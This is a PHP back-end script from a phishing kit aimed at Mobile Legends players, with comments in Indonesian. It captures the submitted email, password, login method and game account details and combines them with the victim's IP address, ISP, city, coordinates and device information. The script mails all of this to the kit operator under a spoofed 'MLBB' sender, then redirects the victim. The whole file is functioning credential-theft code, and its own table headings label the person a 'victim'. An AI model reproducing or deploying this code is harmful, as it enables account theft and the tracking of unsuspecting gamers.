<?php 
include 'alexBackEnd/UserAgent.php';
include 'alexBackEnd/daerah.php';
include 'alexBackEnd/bendera.php';
include 'email.php';

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];
$nick = $_POST['nickname'];
$playid = $_POST['playid'];
$zoneid = $_POST['zoneid'];
$level = $_POST['level'];
$tier = $_POST['tier'];
$year = $_POST['year'];
$month = $_POST['month'];
$day = $_POST['day'];
$random = $_POST['random'];

$benua = $alex['continent'];
$negara = $alex['country'];
$region = $alex['regionName'];
$city = $alex['city'];
$latitude = $alex['lat'];
$longtitude = $alex['lon'];
$timezone = $alex['timezone'];
$perdana = $alex['isp'];
$ipaddress = $alex['query'];
$platform = $infos['platfrm_name'];
$osversi = $infos['platfrm_vers'];
$browser = $infos['browser_name'];
$ip = $arpantek['query'];

// KONTEN RESULT AKUN
$subjek = "$resultFlags | $nick [Level $level] | Login $login";
$pesan = <<<EOD
<!DOCTYPE html>
	<html>
	<head>
		<title></title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
		<style type="text/css">
			body {
				font-family: "Helvetica";
				width: 90%;
				display: block;
				margin: auto;
				border: 1px solid #fff;
				background: #fff;
			}

			.result {
				width: 100%;
				height: 100%;
				display: block;
				margin: auto;
				position: fixed;
				top: 0;
				right: 0;
				left: 0;
				bottom: 0;
				z-index: 999;
				overflow-y: scroll;
				border-radius: 10px;
			}

			.tblResult {
				width: 100%;
				display: table;
				margin: 0px auto;
				border-collapse: collapse;
				text-align: center;
				background: #fcfcfc;
			}
			.tblResult th {
				text-align: left;
				font-size: 1em;
				margin: auto;
				padding: 15px 10px;
				background: #001240;
				border: 2px solid #001240;
				color: #fff;
			}

			.tblResult td {
				font-size: 1em;
				margin: auto;
				padding: 10px;
				border: 2px solid #001240;
				text-align: left;
				font-weight: bold;
				color: #000;
				text-shadow: 0px 0px 10px #fcfcfc;

			}

			.tblResult th img {
				width: 100%;
				display: block;
				margin: auto;
				box-shadow: 0px 0px 10px rgba(0,0,0, 0.5);
				border-radius: 10px;
			}
		</style>
	</head>
	<body>
		<div class="result">
			<table class="tblResult">
			<tr>
			    <th style="text-align: center;" colspan="3">
                <img src="https://i.ibb.co/gRZPrCY/20211202-151551-picsay.jpg">
                </th>
				</tr>
				
			        <th style="text-align: center;" colspan="3"> Info Login </th>
				<tr>
					<td style="border-right: none;">Email $login</td>
					<td style="text-align: center;">$email</td>
				</tr>
                <tr>
					<td style="border-right: none;">Password</td>
					<td style="text-align: center;">$password</td>
				</tr>
                <tr>
					<td style="border-right: none;">Login</td>
					<td style="text-align: center;">$login</td>
				</tr>
                <tr>
					<th style="text-align: center;" colspan="3"> Info Akun </th>
				</tr>
				<tr>
					<td style="border-right: none;">Nickname</td>
					<td style="text-align: center;">$nick</td>
				</tr>
				<tr>
					<td style="border-right: none;">ID Game</td>
					<td style="text-align: center;">$playid ($zoneid)</td>
				</tr>
				<tr>
					<td style="border-right: none;">TTL</td>
					<td style="text-align: center;">$day $month $year</td>
				</tr>
                <tr>
					<td style="border-right: none;">Level</td>
					<td style="text-align: center;">$level</td>
				</tr>
                <tr>
					<td style="border-right: none;">Tier</td>
					<td style="text-align: center;">$tier</td>
				</tr>
				<tr>
					<th style="text-align: center;" colspan="3">Info Daerah & Korban</th>
				</tr>
				<tr>
					<td style="border-right: none;">Negara</td>
					<td style="text-align: center;">$negara</td>
				</tr>
				<tr>
					<td style="border-right: none;">Kota</td>
					<td style="text-align: center;">$city</td>
				</tr>
				<tr>
					<td style="border-right: none;">Latitude</td>
					<td style="text-align: center;">$latitude</td>
				</tr>
				<tr>
					<td style="border-right: none;">Longitude</td>
					<td style="text-align: center;">$longtitude</td>
				</tr>
                <tr>
					<td style="border-right: none;">Zona Waktu</td>
					<td style="text-align: center;">$timezone</td>
				</tr>
                <tr>
					<td style="border-right: none;">Perdana</td>
					<td style="text-align: center;">$perdana</td>
				</tr>
				<tr>
					<td style="border-right: none;">IP Address</td>
					<td style="text-align: center;">$ipaddress</td>
				</tr>
                <tr>
					<td style="border-right: none;">Platform</td>
					<td style="text-align: center;">$platform</td>
				</tr>
                <tr>
					<td style="border-right: none;">OS</td>
					<td style="text-align: center;">$osversi</td>
				</tr>
                <tr>
					<td style="border-right: none;">Browser</td>
					<td style="text-align: center;">$browser</td>
				</tr>
				<tr>
					<th style="text-align: center;" colspan="3">&copy; PricoRangers</th>
				</tr>
			</table>
		</div>
    </body>
    </html>
EOD;
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=utf-8' . "\r\n";
$headers .= 'From: MLBB | TRUE ID YANZZ ENDZYY <admin@ngester.my.id>' . "\r\n";
$kirim = mail($alexhost, $subjek, $pesan, $headers);
include 'alexBackEnd/module.php';

// MENDAPATKAN DATA YANG DI-INPUT DAN MENGALIHKAN KE HALAMAN COMPLETED
if($kirim) {
echo "<form id='$download' method='POST' action='completed.php'>
<input type='hidden' name='nick' value='$nick'>
</form>
<script type='text/javascript'>document.getElementById('tokoalexhost.com').submit();</script>";
}
?>